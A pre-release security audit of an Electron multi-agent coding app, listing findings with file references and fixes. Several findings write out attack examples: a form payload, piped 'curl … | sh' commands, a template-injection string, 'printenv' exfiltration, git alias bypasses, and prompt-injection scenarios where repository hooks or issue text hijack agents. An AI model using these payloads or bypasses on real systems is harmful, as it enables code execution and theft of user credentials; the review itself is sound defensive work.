# Security review, 2026-10-22

Read-only review of `main` (d19a24c) before open-sourcing, by four parallel reviewers (network surface, Electron and renderer, process execution and data, open-source hygiene); the Critical/High items were re-verified by hand. Nothing was run; nothing was modified.

**Bottom line.** The Electron baseline, the network server and git handling are well above average for a desktop tool (see "Done well"). There is **one chain that gives code execution from content an agent or a third-party repository produces** (SEC-1 + SEC-2), and **three design gaps in how agents are confined** (SEC-3, SEC-4, SEC-5) that matter once strangers' repositories and workflows are involved. Fix those five before going public; the rest is hardening.

Severity is for an end user running the app on their own machine against a repository they do not fully control.

## Critical / High

### SEC-1 (High) `will-navigate` allows any `file:` URL; agent markdown can submit a form to it — CONFIRMED
- `apps/desktop/host/main.js:385-390`: only non-`file:` navigations are prevented. Same in `apps/desktop/host/agents-window.js:94`.
- `packages/ui-kit/artifact-render.js:18-29`: `DOMPurify.sanitize(html)` with the default config, which keeps `<form action>`, `<button>`, `<input>`, and accepts relative URLs. The CSP in `apps/desktop/renderer/index.html:5` has no `form-action` and, being a `<meta>` tag, does not apply to the next document.
- No document-level `dragover`/`drop` prevention: dropping an `.html` file on the window navigates to it.
- Scenario: an agent's report, a README of a cloned repo, a PR or issue body shown in the Artifacts panel, run chat, Backlog or Inbox contains `<form action="../../../../tmp/x.html"><button>Open report</button></form>`. One click loads `x.html` (which the agent wrote into the project) as the app page, with the preload and `window.api`.
- Fix: `e.preventDefault()` unconditionally in `will-navigate` (the app never navigates); `will-attach-webview` → prevent; `document.addEventListener('dragover'|'drop', preventDefault)` in `app.js`; DOMPurify `FORBID_TAGS: ['form','input','button','textarea','select','style']`, `FORBID_ATTR: ['action','formaction']`; add `form-action 'none'; object-src 'none'; base-uri 'none'` to the CSP.

### SEC-2 (High) IPC has no sender check: any page with the preload gets a shell — CONFIRMED
- `apps/desktop/host/main.js:161-167`: every service channel is registered as `ipcMain.handle(channel, (_e, arg) => fn(arg))`, sender ignored. The connection window does check (`apps/desktop/host/engine-connection-window.js:188-191`).
- Channels reachable: `term:open` with `kind: 'shell'` plus `term:input` (interactive shell in any workspace or project folder, `packages/engine/service/areas/terminals.js:88-96`), `kind: 'cli-new'` with an arbitrary folder, `localPreview:start` with a client-supplied `config.command`, `app:relaunch`, `settings:set`, `builder:save`, `skills:save`, `agents:create`.
- Scenario: SEC-1's page calls `api.termOpen({kind:'shell', folder})` then `api.termInput(id, 'curl … | sh\n')`.
- Fix: wrap the registration loops with a check that `event.senderFrame === event.sender.mainFrame` and `event.senderFrame.url` is the app page (reuse `isAppPage` from `apps/desktop/host/permissions.js:12-19`). Longer term: gate shell-spawning `term:open` kinds behind a main-process confirmation.

### SEC-3 (High) Isolated Claude agents still load the repository's `.claude/settings*.json` — CONFIRMED
- `packages/shared/providers/claude.js:30-31`: isolation passes `--setting-sources project,local`, which are the files inside the checkout. The comment says "no user settings (plugins, hooks, permission rules)", but project and local settings can declare hooks (`SessionStart`, `PreToolUse`) and `permissions.allow: ["Bash(*)"]`.
- Scenario: a PR branch or a cloned repo ships `.claude/settings.json` with a hook; it runs as the user, headless, before any `--allowedTools` rule applies, on the first agent turn. Defeats everything in `packages/engine/engine/capabilities.js`.
- Amplified by: `packages/engine/service/areas/sessions.js:131-136` and `packages/engine/domains/cli/cli-trust.js:40-74` auto-trust every folder under the workspace, including `repos/` and `worktrees/` (third-party clones), so the CLIs show no trust prompt.
- Fix: drop `project,local` from `--setting-sources` under isolation (or strip/refuse `.claude/settings*.json` that contains `hooks` or `permissions` in the worktree); auto-trust only app-owned folders (`runs/`, `skills/`, `workflows/`), never `repos/`, `worktrees/` or project folders. Document `CLAUDE.md`/`AGENTS.md` of the checkout as a prompt-injection channel.

### SEC-4 (High) Transition `action:` and `ship.build` are rendered templates run through a shell — CONFIRMED
- `packages/engine/engine/run/transitions.js:88,98` and `:409-410`: `render(t.action, scope)` then `runAction`; `packages/engine/engine/machine-actions.js:59-60`: `exec(cmd, { env: process.env })` (`/bin/sh -c` or `cmd.exe /c`).
- `scope` includes `steps.<id>.output.*`, which is JSON the agent printed. The bundled workflows only interpolate an integer (`pr_number`, schema-enforced) or URL filters that throw on anything but a strict URL, so they are safe today; `backlog-refresh.yaml:206` puts `inputs.project_path` inside double quotes (a folder name with `"` or `$(` injects; user-controlled, so Low alone).
- Scenario: a downloaded workflow writes `action: "gh pr comment {{ steps.review.output.summary }}"`; an issue comment the reviewer reads says to end the summary with `; curl evil | sh`.
- Fix: make `action:`/`build:` an argv list run with `execFile` (no shell), or auto-quote every `{{ }}` inside them with a shell-quote filter and refuse interpolations of agent output that are not schema-typed numbers or URL-filtered; lint the bundled workflows.

### SEC-5 (High) Agents and project commands inherit the full environment; `printenv` is allowlisted — CONFIRMED
- `packages/engine/engine/providers.js:427` `{ ...process.env }`; `packages/engine/engine/machine-actions.js:60`, `packages/engine/engine/probes.js:147` `env: process.env`; `packages/engine/engine/suite-step.js` drops only `ELECTRON_|CHROME_CRASHPAD|NPM_|CLAUDECODE|NODE_TEST_CONTEXT|VSCODE_INSPECTOR_OPTIONS|MULTIAGENT_`.
- `packages/engine/engine/capabilities.js:45`: `printenv` is in `READ_UTILITIES`, so every agent with any `bash:` rule may run `Bash(printenv:*)`, and pipes of allowed commands are allowed.
- Scenario: a prompt-injected reviewer with `bash:git, bash:gh` runs `printenv | gh issue comment …` and leaks `AWS_*`, `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`, `SSH_AUTH_SOCK`.
- Fix: build the child env from an allowlist (PATH, HOME/USERPROFILE, TMP/TEMP/TMPDIR, LANG/LC_*, SystemRoot/ComSpec/APPDATA, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `GIT_*`; `GH_*`/`GITLAB_*` only for agents with `bash:gh`/`bash:glab`) plus the workflow's `AGENT_ENV`; remove `printenv` from `READ_UTILITIES`.

## Medium

- **SEC-6 Allowlists are prefix rules, not a sandbox** (design). `Bash(git:*)`, `Bash(npm:*)`, `Bash(node:*)`, `Bash(cargo:*)` admit `git -c alias.x='!cmd' x`, `git -c core.sshCommand=…`, `npm exec`/`npx`, `node -e`, `cargo` build scripts; allowlisted `cat` reads `~/.claude/.credentials.json` or SSH keys. Grok runs with `--always-approve`; only Codex's `-s workspace-write` is OS-enforced. `docs/agents/capabilities.md` says so honestly, `README.md:1991-2020` ("enforced by the engine", "Claude Code isolates fully") does not. Fix: say it in README and SECURITY.md; offer an opt-in container/`sandbox-exec`/bwrap wrapper for untrusted repositories.
- **SEC-7 Untrusted repository scripts run at run start.** `packages/engine/engine/deps-cache.js:366-367` runs `npm ci` without `--ignore-scripts` during checkout (`packages/engine/engine/run/checkout.js:72`); `packages/engine/engine/check-step.js:26-28` and `packages/engine/engine/run/machine-steps.js:161` auto-run `npm run check` / the detected test command via `spawn(…, { shell: true })`. Inherent to "test the project"; document it and offer `--ignore-scripts` for the cache install as a per-project option.
- **SEC-8 `save_as` writes to any path the template yields.** `packages/engine/engine/run/outputs.js:189-194`: `path.resolve(runDir, rel)` with no containment; a third-party workflow with `save_as: "{{ output.path }}"` lets the agent write `~/.ssh/authorized_keys` or `.claude/settings.json` (feeds SEC-3). Fix: require the realpath to stay under the run folder, worktree or project (as `packages/engine/domains/oracle/oracle-tools.js:104-107` does).
- **SEC-9 Workflow YAML is code: unsandboxed nunjucks.** `packages/engine/engine/run/templates.js:26` `autoescape: false`; `{{ ''.constructor.constructor('return process')()… }}` in any rendered field runs in the app process. Agent output is never rendered as a template (no SSTI from agents); js-yaml 4 `load` is the safe schema, `__proto__` is neutralised. Fix: document "workflows, skills and seeds are code", warn when importing a non-bundled workflow, optionally reject templates containing `constructor`/`__proto__`/`require`.
- **SEC-10 Secrets can land in run recordings.** `packages/engine/engine/recorder.js:16-23` applies only the workflow's own `redact` rules; the bundled regex misses `AWS_SECRET_ACCESS_KEY=…`, `Authorization: Bearer …`, PEM blocks; the `spawn` event records the whole argv including `--mcp-config` `env` blocks. Recordings stay local (nothing uploads them; `packages/engine/domains/evidence/findings.js:43-49` scrubs token-shaped strings in bundles). Fix: a baseline redact list inside `Recorder`, redact `--mcp-config` env values, never record `printenv` output.
- **SEC-11 Linux AppImage drops the Chromium sandbox silently.** `scripts/release-assets.js:23-29` launches with `--no-sandbox` when `apparmor_restrict_unprivileged_userns=1`, which is Ubuntu 24.04's default. Fix: ship an AppArmor profile or document the sysctl; at least warn.
- **SEC-12 "Open" on any artifact calls `shell.openPath`.** `apps/desktop/host/main.js:440-446`; the index accepts every extension (`packages/engine/domains/run/run-artifacts.js:29-30`) and the Artifacts screen shows "Open" for `kind: other` (`fronts/build/views/artifacts/artifacts.js:360-363`). An agent-written `report.cmd`/`run.sh` executes on click. Fix: `showItemInFolder` for `other`, deny executable extensions and `+x`.
- **SEC-13 Unsigned releases on every platform.** `deploy.yml:3`; no Authenticode step either. Fuses harden the binary once it runs, but there is no integrity check on download. Fix: Developer ID + notarization, Authenticode; until then signed SHA-256 sums in the release notes.
- **SEC-14 The serve token is root on the engine machine, and only implied.** `packages/engine/server/index.js:108` one flat token; with it a client opens a shell (`terminals.js:77-84`), runs arbitrary `localPreview` commands, resolves `human_approval` gates (`packages/engine/service/channels/runs.js:152`), starts paid runs and lists the user's CLI conversations. Printed as `?token=` on stdout (`scripts/serve.js:129`), stored `{ plain }` when `safeStorage` is unavailable (`apps/desktop/host/engine-connection.js:109`). Fix: say "the token is full control" in README and the serve banner; refuse non-loopback, non-Tailscale `--host` without an explicit `--insecure-http`; `Secure` cookie behind TLS; warn when stored unencrypted. **Fixed (#479).**
- **SEC-15 The desktop window onto a remote engine trusts it completely.** `apps/desktop/host/engine-connection-window.js:132-141`: grants `clipboard-read`/`clipboard-sanitized-write` to the engine origin and opens any `http(s)` link externally; first load is `GET /?token=` over plain HTTP unless the user set up `tailscale serve`. Fix: refuse or opt-in for `http://` hosts that are not loopback or Tailscale (`isTailscaleIp` exists); send the token as an `Authorization` header via `webRequest.onBeforeSendHeaders`; drop `clipboard-read` unless https.

## Low

- **SEC-16** No `Host` pin on the engine server when bound to loopback (the control channel has one, `packages/engine/control/index.js:102,118`); DNS rebinding is defeated today only by the host-scoped `SameSite=Strict` cookie. **Fixed (#479):** a loopback server refuses a foreign `Host` on HTTP and WebSocket.
- **SEC-17** Cookie `multiagent_token` lacks `Secure` and `Max-Age`; token accepted from the query string on any GET (`packages/engine/server/index.js:165-169`); `EnableCookieEncryption` fuse not flipped, so the remote-engine partition's cookie DB holds it in plaintext. **Fixed (#479, #481):** `Max-Age`, `Secure` behind https, a `POST /session` sign-in form, the fuse on.
- **SEC-18** `GrantFileProtocolExtraPrivileges` fuse left on; serving the UI from a custom scheme would let the CSP be a header and give the page a real origin. **Open:** decided after #466.
- **SEC-19** Supabase session falls back to plaintext in `userData/account.bin` when `safeStorage` is unavailable (`apps/desktop/host/main.js:120-123`); warn or do not persist. **Fixed (#481):** a warning at start, documented in SECURITY.md.
- **SEC-20** Phone-gates `/pair` has no attempt counter (40-bit code, 10-minute TTL; loopback by default, so only reachable through the user's own tunnel). **Fixed (#481):** a per-address failure counter answers 429.
- **SEC-21** Supervisor bridge compares its token with `!==` (`packages/engine/domains/supervisor/supervisor-bridge.js:44`); use `tokenCheck`. **Fixed (#481).**
- **SEC-22** Repo-declared `.multiagent/local-preview.yaml` commands run in `/bin/sh -c` after one Confirm click; show the full command, `install` and `env` on the dialog and mark `source: repo`. **Fixed (#481).**
- **SEC-23** `inputs.base_branch` reaches `git fetch origin <base>` without `--end-of-options` (`packages/engine/engine/worktree.js` `baseRef` and `removeWorktree`); user-controlled today. SUSPECTED. **Fixed (#481):** a base that is not a valid branch name is refused, and the fetch passes `--end-of-options`.
- **SEC-24** Oracle `repo_git` denylist lacks `--no-index` (`packages/engine/domains/oracle/oracle-tools.js:85`), so `git diff --no-index /etc/passwd /dev/null` reads outside the project. **Fixed (#481).**
- **SEC-25** Control-channel token is written to `<workspace>/control/endpoint.json`, readable by the agents it governs; the allowlist excludes gates and settings, so note it in the threat model. **Fixed (#481):** mode 0600, in SECURITY.md's threat model; the path stays in the workspace (`multiagent-ctl` finds it there).
- **SEC-26** `localPreview:suggest { dir }` reads any directory (information disclosure only). **Fixed (#481):** project folders and run worktrees only.
- **SEC-27** Windows external terminal title quoting (`apps/desktop/host/external-terminal.js:44,60-66`) uses `""` which cmd.exe does not honour; strip `["&|<>^]` from titles. SUSPECTED. **Fixed (#481).**
- **INFO** Supabase URL and publishable key in `apps/desktop/host/auth-config.js` are meant to ship; RLS is self-row only, `anon` revoked from functions. Expect abuse of the anon key once public: enable rate limits and captcha (dashboard settings, owner; noted in SECURITY.md).

## Done well

- Electron: `contextIsolation`, no `nodeIntegration`, sandbox on, devTools only unpackaged; fuses RunAsNode/NODE_OPTIONS/inspect off, ASAR integrity and OnlyLoadAppFromAsar on; `setWindowOpenHandler` denies everything; permission handler allows only microphone on the app page; CSP with no `unsafe-eval` or inline scripts; no `<webview>`, no remote iframes; the seed iframe is `sandbox=""` with `default-src 'none'`.
- Remote-engine window: `sandbox: true`, no preload, own partition, origin-locked navigation and redirects, token stored OS-encrypted and never handed to a page; its IPC checks the sender.
- Renderer: every markdown surface funnels through `markdownHtml` → DOMPurify; other interpolations are `esc()`ed; images only as data URLs from indexed artifacts; xterm with `allowProposedApi: false` and no link handler.
- Network: constant-time token check on hashes, `Origin == Host` on HTTP and WebSocket upgrade, `HttpOnly; SameSite=Strict`, static files confined to an allowlist with a resolved-path check, `requireId` on every id parameter, JSON-schema checks on channel params, 1 MB WS and 15 MB body caps. Every auxiliary listener (control, phone gates, supervisor bridge, OAuth callback) is loopback-only with a per-start random secret; the control allowlist cannot cross gates; phone answers need device Bearer + HMAC link + `confirm: true`; OAuth is PKCE on `127.0.0.1`.
- Processes: Windows `.cmd` shims go through one escaped `cmd.exe` line (`packages/engine/domains/machine/shell.js`) instead of `shell: true`; every git call is `execFile` with argv, `GIT_TERMINAL_PROMPT=0`, credentials via `gh auth git-credential`; no `--dangerously-skip-permissions` anywhere; `MULTIAGENT_SIMULATION_ONLY` in every agent env.
- Destructive git is contained: worktree removal and `rmSync` only under `<worktreesDir>/<runId>`; no `git clean` or `reset --hard`; local merge is `--ff-only` and refuses dirty checkouts; uncommitted work is committed before removal.
- Gates cannot be forged by agents or the supervisor: approvals resolve only through `resolveApproval` from UI/phone/timeout; `ship` requires `answeredBy === 'user'`.
- Data: Supabase publishable key only, RLS self-row, only `app_version`/`platform` leave the machine; Claude credentials are checked for presence, never read; the Rust sidecar is a pure stdio-to-loopback forwarder with no `unsafe` and no process spawning.
- History and tree are free of secrets and personal paths; CI is fork-safe.

## Honest threat model (for README and SECURITY.md)

An agent turn is `claude -p`, `codex exec` or `grok` running as the user, in a checkout of a repository, with the user's environment, credentials (`gh`, git, cloud SDKs) and network. The engine shapes what the CLI offers the model, but only Codex's sandbox is OS-enforced; for Claude and Grok the limits are prefix rules that an allowed program steps around, and the repository itself can add hooks, permissions and instructions. The realistic failure is a prompt-injected agent that exfiltrates the environment or `~/.claude/.credentials.json`, pushes a branch, or edits `.claude/settings.json` for the next run, headless and without a prompt. The engine's real safety properties are elsewhere: humans gate merges and ships, worktrees keep the user's checkout untouched, and recordings make everything auditable. Say that plainly: run untrusted repositories only in a VM, a container or with Codex's sandbox; treat workflows, skills and seeds as code; assume every secret in the environment is readable by the agents.
